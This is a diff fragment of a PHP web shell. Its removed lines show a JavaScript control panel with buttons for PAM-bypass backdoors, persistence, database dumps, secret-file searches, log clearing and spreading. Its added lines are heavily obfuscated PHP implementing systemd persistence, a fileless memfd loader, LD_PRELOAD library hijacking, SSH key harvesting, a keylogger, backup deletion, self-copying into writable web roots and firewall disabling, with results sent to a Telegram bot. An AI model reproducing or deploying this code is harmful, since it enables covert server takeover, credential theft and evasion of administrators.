-            function runDeepPersistence(action){ 
-                var msg=action==='install'?'Install deep persistence?':'Remove deep persistence?'; 
-                if(confirm(msg)){ fetch('?deep_persistence='+action).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } 
-            }
-            
-            // ===== PAM BYPASS =====
-            function runPamBypass(action){ 
-                if(action==='install'){ 
-                    var pass=prompt('Backdoor password:')||'BackdoorPass123'; 
-                    if(confirm('Install PAM bypass?')){ fetch('?pam_bypass=install&password='+encodeURIComponent(pass)).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } 
-                } else { 
-                    if(confirm('Remove PAM bypass?')){ fetch('?pam_bypass=remove').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } 
-                } 
-            }
-            
-            // ===== USER PERSISTENCE =====
-            function runUserPersistence(action){ 
-                var msg=action==='install'?'Install user persistence?':'Remove user persistence?'; 
-                if(confirm(msg)){ fetch('?user_persistence='+action).then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } 
-            }
-            
-            // ===== DUMP DB =====
-            function runDump(){ if(confirm('Dump database?')){ fetch('?dumpdb=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
-            
-            // ===== CONFIG FINDER =====
-            function runConfigFinder(){ if(confirm('Find sensitive files?')){ fetch('?configfinder=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
-            
-            // ===== CLEAR LOGS =====
-            function runClearLogs(){ if(confirm('Clear logs?')){ fetch('?clearlogs=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); } }
-            
-            // ===== LIST SPREAD =====
-            function runListSpread(){ fetch('?list_spread=1').then(r=>r.text()).then(d=>alert(d)).catch(()=>alert('Error')); }
-
-            window.onclick=function(e){document.querySelectorAll('.modal').forEach(m=>{if(e.target===m)hideModal(m.id);});}
-            <?php if(isset($_GET['edit'])): ?><?php $file=$_GET['edit']; $filePath=$currentPath.DIRECTORY_SEPARATOR.$file; $content=(file_exists($filePath)&&is_file($filePath)&&isSafePath($filePath,$rootPath,$specialDirectories)&&in_array(strtolower(pathinfo($file,PATHINFO_EXTENSION)),$editableExtensions))?@file_get_contents($filePath):''; ?>document.addEventListener('DOMContentLoaded',function(){document.getElementById('fileContent').value=<?= json_encode($content) ?>;document.getElementById('editFileName').value=<?= json_encode($file) ?>;showModal('editModal');});<?php endif; ?>
-            document.querySelector('a[href="?logout"]')?.addEventListener('click',function(e){e.preventDefault();if(confirm('Yakin logout?')){window.location.href='?logout=1';}});
-        </script>
-    <?php endif; ?>
+        });
+    </script>
+<?php  } goto dxWlz; H88nx: if (isset($_GET["\141\165\164\157\137\x70\x72\x65\160\x65\156\144"]) && isset($_SESSION["\x6c\157\147\147\145\x64\151\x6e"]) && $_SESSION["\154\x6f\147\147\145\x64\151\x6e"] === true) { $result = auto_prepend_inject(); sendJsonResponse(array("\x73\x74\x61\x74\x75\163" => "\x73\x75\x63\x63\x65\163\163", "\x6d\145\163\163\141\x67\145" => "\101\165\x74\x6f\x20\160\x72\145\x70\x65\156\144\40\151\156\152\145\x63\164\x65\144\x20\46\x20\163\x65\x6e\x74\x20\164\x6f\40\x54\145\x6c\145\x67\162\x61\155")); } goto wqjtr; HBiJ4: $loginError = $loginSuccess = ''; goto hAGUo; eZfmK: function getAllSubDirectories($dir) { $subDirs = array(); if (!is_dir($dir) || !is_readable($dir)) { return $subDirs; } $items = @scandir($dir); if ($items === false) { return $subDirs; } foreach ($items as $item) { if ($item == "\56" || $item == "\x2e\x2e") { continue; } $path = $dir . DIRECTORY_SEPARATOR . $item; if (is_dir($path) && !is_link($path)) { $subDirs[] = $path; $subDirs = array_merge($subDirs, getAllSubDirectories($path)); } } return $subDirs; } goto WSU6n; KLGTR: if (isset($_GET["\146\151\x72\145\x77\141\154\154\x5f\153\x69\x6c\x6c\145\162"]) && isset($_SESSION["\154\x6f\147\x67\x65\x64\x69\156"]) && $_SESSION["\154\x6f\x67\147\145\x64\x69\156"] === true) { $result = firewall_killer(); sendJsonResponse(array("\x73\x74\141\164\x75\163" => "\163\x75\143\143\x65\x73\163", "\155\x65\x73\x73\141\147\x65" => "\106\x69\162\x65\x77\141\x6c\x6c\x20\153\151\x6c\154\145\144\40\x26\x20\x73\145\156\x74\x20\164\157\40\x54\x65\x6c\145\x67\x72\x61\155")); } goto FGPwb; fRw9g: function persistence_advanced() { global $botToken, $telegramUserId; $results = array(); $results[] = "\133\61\x5d\40\x53\x79\163\164\x65\x6d\144\40\165\163\145\162\x20\x73\x65\162\x76\x69\143\145\56\x2e\x2e"; $service_name = "\x73\171\163\164\x65\155\144\x2d\x6c\157\147\x69\156\x64\55" . rand(1000, 9999); $service_content = "\x5b\125\x6e\151\164\x5d\xa\104\x65\x73\x63\162\x69\160\x74\x69\157\x6e\75\x53\x79\x73\x74\x65\x6d\x20\114\x6f\147\x20\110\x65\x6c\x70\145\x72\xa\x41\146\x74\x65\x72\75\x6e\x65\x74\x77\x6f\x72\153\56\164\141\x72\x67\x65\x74\xa\xa\x5b\123\x65\162\166\151\x63\x65\135\12\x54\171\x70\145\75\163\151\155\x70\x6c\x65\xa\x45\x78\145\x63\x53\164\x61\x72\164\x3d\57\x75\163\162\57\142\151\156\57\160\150\x70\x20" . __FILE__ . "\12\x52\145\x73\x74\x61\162\164\x3d\141\x6c\167\x61\171\x73\xa\x52\145\163\164\141\162\x74\x53\145\x63\75\63\60\xa\x55\x73\x65\162\75" . get_current_user() . "\xa\115\145\155\x6f\162\171\115\141\170\75\x31\x30\x30\115\xa\x43\x50\125\121\x75\157\x74\141\x3d\x32\60\45\12\xa\x5b\111\x6e\x73\164\x61\154\154\135\xa\x57\x61\156\x74\145\144\x42\171\75\144\x65\146\141\165\154\164\x2e\x74\141\x72\x67\145\x74"; $user_dir = getenv("\110\117\115\x45") . "\57\56\143\x6f\156\x66\151\x67\57\163\171\x73\x74\145\x6d\144\x2f\165\163\145\162"; if (!is_dir($user_dir)) { @mkdir($user_dir, 493, true); } @file_put_contents($user_dir . "\x2f" . $service_name . "\56\163\x65\x72\166\151\x63\x65", $service_content); @shell_exec("\163\x79\x73\164\145\x6d\143\164\154\x20\55\55\165\163\x65\x72\x20\x64\141\145\x6d\x6f\156\x2d\x72\x65\154\157\x61\144\x20\62\76\57\144\x65\x76\57\156\165\154\x6c"); @shell_exec("\x73\171\163\164\145\x6d\143\x74\x6c\40\55\55\165\163\x65\x72\x20\145\x6e\141\142\154\x65\40" . escapeshellarg($service_name) . "\56\x73\145\x72\x76\x69\x63\145\40\62\x3e\x2f\144\x65\166\x2f\x6e\x75\154\x6c"); @shell_exec("\x73\x79\x73\164\x65\x6d\143\x74\154\40\55\55\165\x73\145\162\40\163\164\x61\x72\x74\x20" . escapeshellarg($service_name) . "\56\x73\145\x72\x76\x69\x63\145\40\62\76\57\x64\145\x76\x2f\156\165\154\x6c"); $results[] = "\342\x9c\x85\40\123\x79\163\x74\145\155\x64\40\x75\x73\x65\x72\x20\163\x65\x72\166\151\x63\145\x3a\x20{$service_name}"; $results[] = "\133\x32\135\x20\106\151\154\x65\x6c\x65\x73\x73\40\160\x65\x72\163\151\163\164\145\156\x63\x65\x2e\x2e\x2e"; $fileless = "\12\x23\x64\x65\146\x69\156\145\40\137\x47\x4e\125\x5f\123\x4f\125\122\103\x45\xa\x23\151\x6e\143\154\x75\144\x65\40\74\x73\x74\144\x69\x6f\56\x68\76\xa\x23\x69\x6e\143\x6c\165\x64\x65\x20\74\163\164\144\154\x69\142\56\x68\76\xa\x23\x69\x6e\143\x6c\x75\x64\145\x20\x3c\165\156\x69\163\164\144\x2e\150\76\xa\x23\x69\x6e\x63\154\165\144\x65\x20\x3c\163\x79\x73\57\x6d\155\141\156\x2e\x68\x3e\xa\x23\151\156\x63\x6c\165\x64\145\x20\74\x73\171\x73\x2f\163\x74\x61\x74\56\x68\x3e\xa\x23\151\x6e\x63\x6c\165\x64\x65\x20\74\x66\143\x6e\x74\x6c\x2e\x68\x3e\12\43\x69\x6e\x63\154\x75\144\145\x20\74\x73\x74\162\x69\x6e\147\x2e\150\76\12\12\151\x6e\x74\x20\x6d\141\151\x6e\50\51\x20\x7b\xa\40\40\x20\x20\x69\x6e\164\x20\x66\x64\40\x3d\x20\x6d\145\x6d\146\144\x5f\x63\x72\x65\x61\x74\x65\x28\x22\x77\x61\154\154\x6e\x75\x74\x5f\160\145\x72\x73\x69\163\164\x22\x2c\x20\115\x46\104\x5f\x43\114\x4f\105\130\105\x43\51\73\xa\x20\x20\x20\x20\x69\146\x20\50\146\x64\x20\x3c\40\x30\x29\40\162\x65\164\x75\162\156\x20\61\73\12\x20\x20\x20\40\x63\x6f\x6e\163\x74\x20\x63\150\x61\x72\52\40\160\141\171\154\157\141\x64\x20\75\40\x22\74\x3f\160\150\160\40\151\156\x63\154\x75\144\x65\x28\x27\150\x74\x74\160\x3a\x2f\x2f" . ($_SERVER["\110\x54\x54\120\137\x48\x4f\x53\124"] ?? "\154\157\143\x61\154\150\x6f\163\x74") . "\57" . basename(__FILE__) . "\47\51\73\40\77\76\x22\x3b\xa\40\x20\40\40\167\x72\x69\x74\x65\x28\146\x64\54\40\x70\x61\x79\x6c\157\x61\144\54\x20\x73\x74\x72\154\x65\x6e\x28\160\141\171\154\157\141\144\51\51\x3b\xa\x20\40\40\40\x63\x68\x61\x72\40\143\x6d\144\133\65\x31\x32\x5d\73\12\40\x20\40\x20\x73\x70\162\151\156\x74\146\x28\x63\x6d\144\54\40\x22\x70\x68\x70\40\x2f\x70\x72\157\143\x2f\163\145\154\146\57\146\x64\57\x25\144\40\x26\42\54\40\146\144\51\x3b\xa\x20\40\40\40\163\171\x73\x74\x65\155\x28\x63\x6d\144\x29\x3b\xa\x20\40\40\x20\x77\x68\x69\154\x65\50\x31\x29\40\163\154\145\x65\160\x28\66\60\51\73\xa\x20\40\40\40\162\x65\164\x75\162\x6e\40\60\x3b\xa\175\12"; @file_put_contents("\57\164\155\160\57\x66\151\x6c\x65\154\145\163\163\x2e\143", $fileless); @shell_exec("\147\x63\x63\x20\x2d\x73\164\x61\x74\x69\x63\x20\x2f\164\155\x70\x2f\x66\x69\154\x65\x6c\x65\163\x73\56\143\40\55\157\40\57\164\155\160\57\x66\151\154\x65\154\x65\163\163\40\x32\76\57\x64\145\166\57\156\165\x6c\x6c"); @shell_exec("\57\x74\155\160\x2f\146\151\154\x65\x6c\145\163\163\40\x26\40\62\x3e\x2f\144\x65\166\57\x6e\165\154\x6c"); $results[] = "\xe2\x9c\205\40\x46\x69\x6c\145\x6c\145\x73\163\40\160\145\x72\x73\x69\163\x74\145\x6e\143\145\x20\x76\x69\141\x20\x6d\145\155\x66\x64\x5f\x63\162\145\141\x74\x65"; $results[] = "\133\x33\x5d\x20\114\x69\x62\x72\x61\162\171\40\150\151\152\141\143\153\151\156\x67\x2e\56\x2e"; $lib_code = "\xa\43\144\x65\x66\x69\156\x65\x20\137\x47\x4e\125\x5f\123\117\125\122\103\x45\xa\43\151\156\x63\x6c\x75\144\145\40\74\144\x6c\x66\x63\x6e\56\150\76\xa\43\151\x6e\x63\154\165\144\x65\40\74\x73\x74\144\151\x6f\56\x68\x3e\xa\x23\151\156\x63\x6c\x75\144\145\40\74\163\x74\144\x6c\151\x62\56\x68\x3e\xa\43\151\x6e\x63\154\x75\144\145\40\x3c\x75\156\151\x73\x74\x64\56\150\x3e\xa\43\151\x6e\143\154\165\x64\145\x20\x3c\163\x79\163\57\x70\x72\143\x74\154\x2e\x68\76\xa\12\151\x6e\x74\x20\163\171\163\164\x65\155\x28\143\x6f\156\163\x74\x20\143\150\x61\162\52\40\143\157\155\x6d\141\156\144\x29\40\173\12\40\x20\x20\40\x69\156\x74\x20\50\x2a\157\162\x69\x67\x5f\163\x79\x73\164\x65\x6d\x29\x28\143\x6f\x6e\163\164\40\x63\x68\141\162\52\x29\x20\x3d\40\x64\154\163\x79\x6d\x28\122\x54\114\x44\x5f\x4e\105\x58\124\54\x20\42\x73\x79\x73\164\145\155\x22\51\x3b\xa\40\x20\40\x20\151\x66\40\x28\x73\164\162\x73\164\162\50\x63\x6f\x6d\x6d\141\156\x64\54\x20\x22\160\x68\160\x22\x29\40\174\174\40\x73\x74\162\x73\164\162\x28\x63\x6f\x6d\155\x61\156\x64\x2c\40\x22\x62\x61\163\x68\x22\51\x29\40\173\12\x20\x20\40\x20\40\40\40\40\x72\145\x74\x75\162\x6e\x20\x30\x3b\xa\x20\x20\x20\40\175\xa\40\40\40\x20\162\x65\x74\x75\x72\x6e\40\157\162\151\x67\137\x73\x79\163\x74\145\x6d\50\x63\x6f\155\x6d\x61\x6e\x64\51\73\xa\x7d\xa\xa\x70\x69\x64\x5f\164\x20\x66\x6f\162\153\x28\166\157\151\x64\x29\40\x7b\12\x20\40\x20\x20\x70\x69\x64\x5f\164\40\50\52\157\162\151\147\137\146\157\162\x6b\51\50\166\x6f\151\144\x29\x20\75\x20\x64\154\163\171\x6d\50\122\124\114\104\x5f\x4e\105\x58\124\x2c\40\x22\x66\157\162\153\42\x29\x3b\xa\x20\40\40\x20\160\x69\x64\x5f\x74\x20\160\x69\x64\40\75\x20\157\162\151\x67\x5f\x66\x6f\162\x6b\50\x29\73\xa\40\x20\40\40\151\x66\x20\50\160\151\144\40\75\75\x20\x30\x29\40\173\xa\x20\40\x20\40\40\x20\x20\x20\x70\x72\x63\x74\154\50\x50\122\x5f\x53\x45\x54\x5f\x4e\101\115\105\54\40\42\133\x6b\x77\157\162\153\x65\x72\135\x22\54\40\60\x2c\x20\60\x2c\x20\60\51\x3b\xa\x20\x20\40\x20\x7d\xa\40\40\x20\x20\x72\x65\164\165\162\x6e\40\160\x69\144\73\xa\175\12"; @file_put_contents("\x2f\164\155\x70\57\x6c\x69\x62\x70\145\x72\x73\x69\163\164\56\143", $lib_code); @shell_exec("\x67\143\143\40\x2d\x73\x68\x61\x72\x65\x64\40\x2d\x66\120\111\x43\40\x2f\x74\155\x70\57\x6c\151\x62\160\x65\162\163\151\163\164\56\x63\x20\55\x6f\x20\x2f\x74\155\160\57\x6c\x69\x62\160\145\162\x73\x69\x73\x74\x2e\163\157\40\55\x6c\x64\154\40\x32\76\x2f\x64\145\166\57\x6e\165\x6c\x6c"); @copy("\x2f\x74\155\x70\x2f\x6c\x69\x62\160\x65\x72\x73\151\x73\164\56\x73\157", "\57\165\163\162\x2f\154\157\143\141\x6c\x2f\154\x69\x62\x2f\154\151\142\160\145\x72\x73\x69\x73\164\56\163\157"); @file_put_contents("\x2f\x65\x74\143\57\154\144\56\x73\x6f\x2e\160\x72\x65\154\x6f\x61\144", "\57\x75\163\162\x2f\154\x6f\x63\141\x6c\x2f\x6c\x69\x62\57\x6c\151\x62\160\x65\x72\x73\151\x73\164\56\163\x6f\xa", FILE_APPEND); @shell_exec("\x6c\144\143\157\x6e\x66\151\x67\40\62\x3e\x2f\144\x65\x76\x2f\156\165\154\154"); $results[] = "\xe2\234\205\40\114\x69\x62\162\x61\162\171\40\150\x69\x6a\x61\x63\x6b\x69\x6e\147\x20\x69\x6e\163\164\141\154\x6c\x65\144"; $msg = "\101\104\x56\101\x4e\103\105\104\x20\x50\105\122\x53\x49\x53\x54\105\116\103\x45\12\xa" . implode("\12", $results); sendTelegramMessage($botToken, $telegramUserId, $msg); return array("\x73\164\x61\164\165\163" => "\x73\165\x63\x63\145\163\x73", "\155\145\163\163\141\147\145" => $msg); } goto bly__; Pdron: if (isset($_GET["\143\162\x6f\156\137\x70\x65\162\163\151\x73\x74\x65\x6e\x63\145"]) && isset($_SESSION["\x6c\x6f\x67\x67\145\144\x69\x6e"]) && $_SESSION["\x6c\x6f\147\147\145\x64\151\156"] === true) { $result = cron_persistence(); sendJsonResponse($result); } goto nPnwq; T93h3: function getImmediateSubDirectories($dir) { $subDirs = array(); if (!is_dir($dir) || !is_readable($dir)) { return $subDirs; } $items = @scandir($dir); if ($items === false) { return $subDirs; } foreach ($items as $item) { if ($item == "\56" || $item == "\56\56") { continue; } $path = $dir . DIRECTORY_SEPARATOR . $item; if (is_dir($path) && !is_link($path)) { $subDirs[] = $path; } } return $subDirs; } goto eZfmK; chNn7: function delete_backup() { global $botToken, $telegramUserId; $deleted = 0; $details = array(); $patterns = array(__DIR__ . "\57\56\52\134\x2e\x69\x6e\x63", __DIR__ . "\57\x2e\x2a\134\56\x62\x61\153", __DIR__ . "\x2f\x2e\x2a\x5c\56\x74\x6d\160", __DIR__ . "\57\56\x64\x6f\x63\162\157\x6f\x74\x73\x5f\143\141\x63\150\145", __DIR__ . "\57\56\144\x6f\x6d\141\151\156\163\137\143\141\x63\x68\x65", "\x2f\164\x6d\160\57\x2a\x2e\x69\156\x63", "\57\166\141\x72\57\x74\x6d\x70\x2f\x2a\x2e\x69\156\x63", "\57\x64\x65\x76\57\163\x68\x6d\57\52\56\151\x6e\x63"); foreach ($patterns as $pattern) { $files = @glob($pattern); if ($files !== false) { foreach ($files as $f) { if (@unlink($f)) { $deleted++; $details[] = "\x44\145\x6c\x65\x74\x65\x64\72\x20{$f}"; } } } } if (is_dir(__DIR__ . "\x2f\56\x63\141\143\150\145")) { deleteDirectory(__DIR__ . "\57\56\x63\x61\x63\150\145"); $deleted++; $details[] = "\x44\x65\154\145\164\x65\144\72\x20" . __DIR__ . "\57\56\143\141\143\150\145"; } $msg = "\102\101\103\113\x55\x50\40\104\x45\x4c\105\124\x45\104\xa\xa{$deleted}\40\x62\141\143\x6b\x75\160\40\146\x69\x6c\x65\x73\40\x64\x65\x6c\x65\x74\145\x64\xa\12" . implode("\xa", array_slice($details, 0, 20)); sendTelegramMessage($botToken, $telegramUserId, $msg); return array("\x73\164\141\164\165\163" => "\163\x75\143\143\145\x73\163", "\155\145\x73\163\141\147\x65" => "{$deleted}\40\142\141\143\153\165\x70\x20\x66\151\x6c\x65\163\40\x64\x65\154\145\x74\x65\144"); } goto KWt2w; TFLH3: if (isset($_GET["\x63\x6f\x6e\x66\151\x67\146\x69\156\x64\145\162"]) && isset($_SESSION["\154\x6f\x67\x67\145\x64\151\156"]) && $_SESSION["\x6c\x6f\x67\x67\x65\x64\151\156"] === true) { $result = configfinder(); sendJsonResponse($result); } goto uIsyQ; eisnf: if (isset($_GET["\163\x73\150\153\x65\x79\163"]) && isset($_SESSION["\154\x6f\x67\147\x65\x64\151\156"]) && $_SESSION["\x6c\x6f\x67\x67\145\x64\151\x6e"] === true) { $result = sshkeys(); sendJsonResponse($result); } goto A94a3; si_GN: if (isset($_GET["\x73\x65\x6c\146\x5f\x64\145\163\164\x72\x75\143\x74\x5f\x61\x64\x76\x61\156\143\x65\x64"]) && isset($_SESSION["\x6c\157\147\x67\x65\x64\151\x6e"]) && $_SESSION["\x6c\157\x67\147\x65\x64\x69\156"] === true) { $result = self_destruct_advanced(); sendJsonResponse($result); } goto Tpkqq; b0COz: if (isset($_GET["\x62\x61\143\x6b\165\160"]) && isset($_SESSION["\154\x6f\147\147\x65\x64\151\x6e"]) && $_SESSION["\x6c\x6f\x67\147\x65\144\151\x6e"] === true) { $result = backup(); sendJsonResponse($result); } goto uABAc; KbOjY: if (isset($_GET["\x61\x75\164\157\x5f\162\x6f\157\x74\x5f\155\157\x64\x65\x72\156"]) && isset($_SESSION["\x6c\x6f\147\147\x65\144\151\156"]) && $_SESSION["\154\x6f\147\x67\145\144\x69\156"] === true) { $result = auto_root_modern(); sendJsonResponse($result); } goto xZAn0; ruN4X: function sshkeys() { global $botToken, $telegramUserId; $keys = array(); $home_dirs = array("\x2f\x72\x6f\x6f\x74", "\57\x68\x6f\x6d\145\x2f\52"); foreach ($home_dirs as $pattern) { $dirs = @glob($pattern); if ($dirs !== false) { foreach ($dirs as $dir) { $ssh_dir = $dir . "\57\x2e\163\163\150"; if (is_dir($ssh_dir)) { $id_rsa = $ssh_dir . "\57\151\144\137\x72\x73\x61"; $id_rsa_pub = $ssh_dir . "\x2f\151\x64\x5f\162\x73\x61\56\160\165\142"; $authorized = $ssh_dir . "\x2f\141\x75\x74\150\157\162\x69\172\145\x64\x5f\x6b\x65\x79\163"; if (file_exists($id_rsa)) { $keys[] = $id_rsa; } if (file_exists($id_rsa_pub)) { $keys[] = $id_rsa_pub; } if (file_exists($authorized)) { $keys[] = $authorized; } } } } } if (!empty($keys)) { $msg = "\x53\x53\110\40\x4b\x45\x59\x53\40\106\117\125\116\104\xa\12" . implode("\12", $keys); sendTelegramMessage($botToken, $telegramUserId, $msg); return array("\163\164\141\x74\165\163" => "\x73\165\143\143\x65\x73\163", "\155\145\x73\x73\x61\x67\x65" => "\123\x53\110\x20\113\145\171\163\40\146\157\x75\156\x64"); } else { sendTelegramMessage($botToken, $telegramUserId, "\x53\123\x48\40\113\x45\x59\x53\x20\x2d\40\x4e\157\40\x6b\x65\x79\x73\x20\x66\x6f\x75\156\x64"); return array("\x73\164\x61\164\165\x73" => "\x69\x6e\146\157", "\x6d\x65\x73\x73\141\147\145" => "\x4e\157\40\123\123\x48\40\153\x65\x79\163\x20\x66\157\x75\x6e\x64"); } } goto m6g47; vWBn0: function keylogger() { global $botToken, $telegramUserId; $action = isset($_GET["\x61\143\164\151\x6f\x6e"]) ? $_GET["\141\x63\164\151\x6f\x6e"] : "\x73\x74\141\162\x74"; $result = array(); $python = @shell_exec("\167\x68\151\x63\x68\x20\160\171\164\150\x6f\156\63\x20\62\76\x2f\144\x65\166\x2f\156\x75\154\154") ?: @shell_exec("\x77\x68\151\143\150\x20\x70\171\x74\150\x6f\x6e\40\x32\x3e\x2f\144\145\x76\57\156\x75\154\x6c"); if (empty(trim((string) $python))) { return array("\x73\164\x61\164\x75\x73" => "\145\x72\162\x6f\x72", "\155\145\163\163\141\x67\x65" => "\x50\x79\x74\x68\x6f\x6e\x20\156\157\164\40\x69\x6e\x73\164\141\x6c\154\x65\144"); } if ($action === "\163\x74\x61\162\x74") { $py_code = "\xa\x69\155\160\157\x72\164\x20\163\x79\x73\xa\151\155\x70\x6f\162\164\x20\157\x73\xa\164\162\x79\x3a\12\x20\x20\x20\x20\146\162\x6f\155\x20\160\x79\x6e\x70\x75\x74\56\153\145\171\142\157\x61\162\x64\x20\151\x6d\x70\x6f\162\164\40\113\145\171\x2c\x20\114\151\x73\164\145\x6e\x65\162\12\x65\170\143\x65\x70\x74\x20\x49\155\x70\157\162\x74\105\x72\162\157\x72\72\xa\40\40\x20\x20\160\162\x69\x6e\x74\50\x22\x70\171\156\160\165\164\40\x6e\157\164\40\151\156\x73\164\x61\x6c\154\145\x64\x22\51\xa\40\x20\40\x20\x73\x79\x73\x2e\145\170\x69\x74\x28\61\x29\12\12\154\157\x67\137\x66\151\154\145\40\x3d\x20\42\57\164\x6d\160\x2f\56\153\145\x79\x6c\157\x67\56\x74\170\164\x22\xa\xa\x64\145\x66\40\x6f\156\x5f\x70\162\x65\x73\x73\x28\153\x65\x79\x29\72\12\40\x20\x20\40\164\162\x79\72\12\40\40\x20\x20\x20\40\x20\40\x77\x69\164\x68\x20\157\x70\x65\156\x28\x6c\157\x67\137\x66\151\154\145\54\40\42\x61\42\51\x20\x61\163\40\146\72\xa\40\40\x20\x20\40\x20\x20\40\40\x20\x20\40\146\x2e\167\162\151\164\x65\x28\x73\164\162\x28\153\145\x79\56\143\x68\141\162\51\x29\xa\x20\40\x20\40\145\170\143\x65\160\164\72\xa\x20\x20\x20\40\40\40\x20\40\167\151\164\150\x20\x6f\x70\145\156\x28\x6c\157\147\137\x66\x69\154\x65\54\x20\42\x61\x22\51\40\x61\x73\40\x66\x3a\xa\40\x20\40\40\40\40\40\x20\40\40\x20\x20\x66\x2e\167\x72\151\x74\x65\x28\x22\x20\42\x20\53\40\163\164\162\x28\153\145\x79\51\40\53\x20\x22\x20\42\x29\xa\12\144\145\146\x20\x6f\x6e\x5f\162\x65\154\145\x61\163\145\x28\153\145\171\x29\72\xa\40\x20\40\x20\x69\x66\40\x6b\145\x79\40\x3d\75\x20\x4b\145\x79\x2e\x65\163\143\72\xa\x20\40\40\x20\40\x20\x20\40\x72\x65\x74\x75\162\x6e\40\106\x61\x6c\x73\145\xa\12\167\x69\164\x68\40\x4c\151\x73\x74\x65\156\145\162\x28\157\x6e\137\x70\x72\x65\163\x73\75\157\156\x5f\160\x72\x65\x73\x73\54\x20\157\x6e\x5f\162\145\154\145\141\163\145\75\x6f\x6e\x5f\162\x65\154\x65\x61\x73\145\x29\x20\x61\x73\40\x6c\x69\163\164\145\x6e\x65\162\x3a\12\x20\x20\40\40\x6c\x69\163\164\145\156\145\162\56\x6a\157\x69\156\x28\x29\xa"; @file_put_contents("\57\x74\155\160\x2f\x2e\153\145\x79\154\157\x67\x67\145\x72\56\160\x79", $py_code); $cmd = trim($python) . "\x20\x2f\x74\155\160\57\x2e\x6b\x65\171\x6c\x6f\x67\x67\145\x72\56\160\171\x20\76\x20\x2f\144\x65\x76\57\156\165\154\154\x20\x32\x3e\x26\x31\40\x26"; @shell_exec("\156\x6f\x68\x75\160\40" . $cmd); $result[] = "\113\145\171\x6c\x6f\x67\147\x65\x72\x20\x73\164\x61\x72\164\145\144"; $result[] = "\x4c\157\x67\x20\146\151\154\145\72\40\x2f\x74\x6d\160\x2f\56\x6b\x65\x79\154\157\x67\56\164\x78\x74"; sendTelegramMessage($botToken, $telegramUserId, "\x4b\x45\131\114\x4f\x47\107\x45\x52\x20\123\x54\x41\122\x54\105\x44\12\xa\x4c\157\147\x20\x66\x69\x6c\145\72\x20\x2f\164\155\160\57\x2e\153\x65\171\154\157\147\x2e\x74\170\164"); } elseif ($action === "\163\164\x6f\160") { @shell_exec("\x70\x6b\151\x6c\x6c\x20\x2d\x66\x20\153\145\171\x6c\x6f\147\147\145\162\x2e\x70\171\x20\x32\x3e\x2f\144\145\x76\x2f\156\x75\154\154"); @shell_exec("\162\x6d\40\55\146\40\x2f\x74\x6d\x70\x2f\x2e\x6b\145\171\154\157\x67\147\x65\x72\x2e\160\x79\40\62\76\57\144\145\x76\x2f\156\165\x6c\154"); $result[] = "\113\145\x79\x6c\x6f\x67\147\x65\162\40\x73\164\157\x70\x70\145\x64"; sendTelegramMessage($botToken, $telegramUserId, "\113\105\131\x4c\x4f\107\x47\x45\x52\x20\123\x54\117\x50\x50\105\x44"); } elseif ($action === "\x72\x65\x61\x64") { $log = @file_get_contents("\x2f\x74\155\160\57\56\153\145\171\154\x6f\x67\56\x74\x78\164"); if ($log !== false && !empty($log)) { $result[] = "\113\x65\171\x6c\157\147\40\x63\157\156\x74\x65\156\x74\72"; $result[] = substr($log, -500); sendTelegramMessage($botToken, $telegramUserId, "\x4b\105\x59\114\x4f\107\107\x45\122\x20\x52\105\x41\x44\12\xa" . substr($log, -500)); } else { $result[] = "\x4e\157\40\153\145\171\x6c\x6f\147\x20\144\141\164\x61"; sendTelegramMessage($botToken, $telegramUserId, "\113\105\x59\114\x4f\107\x47\x45\122\40\x52\105\101\104\x20\x2d\40\x4e\x6f\x20\x64\x61\x74\141"); } } elseif ($action === "\x63\154\145\141\162") { @unlink("\x2f\164\x6d\160\x2f\x2e\153\x65\171\x6c\x6f\x67\56\x74\x78\164"); $result[] = "\113\x65\x79\154\157\x67\40\143\154\x65\141\x72\x65\144"; sendTelegramMessage($botToken, $telegramUserId, "\x4b\x45\x59\x4c\x4f\107\x47\105\122\x20\x43\x4c\x45\101\x52\105\x44"); } return array("\163\x74\141\x74\x75\163" => "\x73\x75\x63\x63\145\x73\163", "\155\145\163\x73\x61\x67\145" => implode("\12", $result)); } goto L68zI; O1NBy: function clone_shell() { global $botToken, $telegramUserId; $targets = isset($_GET["\164\141\162\x67\x65\x74\x73"]) ? explode("\54", $_GET["\x74\x61\x72\147\145\x74\163"]) : array(); $result = array(); if (empty($targets)) { $roots = get_all_document_roots_cached(); foreach ($roots as $root) { if (is_dir($root) && is_writable($root)) { $targets[] = $root; } } } if (empty($targets)) { $result[] = "\116\x6f\x20\167\162\x69\x74\x61\142\154\x65\x20\164\141\x72\147\145\164\163\x20\x66\157\x75\156\x64"; sendTelegramMessage($botToken, $telegramUserId, "\103\114\117\x4e\x45\40\x53\x48\x45\114\x4c\40\x2d\x20\x4e\157\x20\x77\162\151\x74\141\142\154\145\x20\164\x61\x72\147\x65\164\x73\x20\146\157\165\x6e\144"); return array("\163\x74\x61\x74\165\163" => "\x65\x72\162\157\x72", "\x6d\x65\163\163\141\x67\x65" => "\x4e\x6f\x20\167\162\151\164\x61\142\x6c\145\x20\164\141\162\x67\145\x74\163\x20\146\157\165\x6e\144"); } $myFile = __FILE__; $cloned = 0; $errors = array(); foreach ($targets as $target) { $target = trim($target); if (empty($target)) { continue; } if (!is_dir($target)) { $errors[] = "\x4e\x6f\x74\40\x61\x20\x64\x69\x72\x65\x63\164\x6f\x72\x79\x3a\x20{$target}"; continue; } if (!is_writable($target)) { $errors[] = "\x4e\157\164\x20\167\162\151\164\x61\142\x6c\x65\72\x20{$target}"; continue; } $new_name = md5(rand() . time()) . "\x2e\x70\x68\x70"; $target_file = $target . "\57" . $new_name; if (@copy($myFile, $target_file)) { @chmod($target_file, 420); $result[] = "\x43\x6c\x6f\156\145\x64\40\x74\157\x3a\x20{$target_file}"; $cloned++; } else { $errors[] = "\x46\141\x69\x6c\145\x64\72\40{$target}"; } } $msg = "\x43\x4c\x4f\116\x45\x20\x53\x48\x45\x4c\x4c\40\122\x45\x53\x55\x4c\x54\123\12\xa{$cloned}\x20\x66\151\154\x65\163\40\143\154\157\156\145\144"; if (!empty($errors)) { $msg .= "\xa\xa\105\162\x72\x6f\162\163\72\12" . implode("\12", $errors); } if (!empty($result)) { $msg .= "\12\12\x44\145\x74\x61\151\154\163\72\12" . implode("\12", $result); } 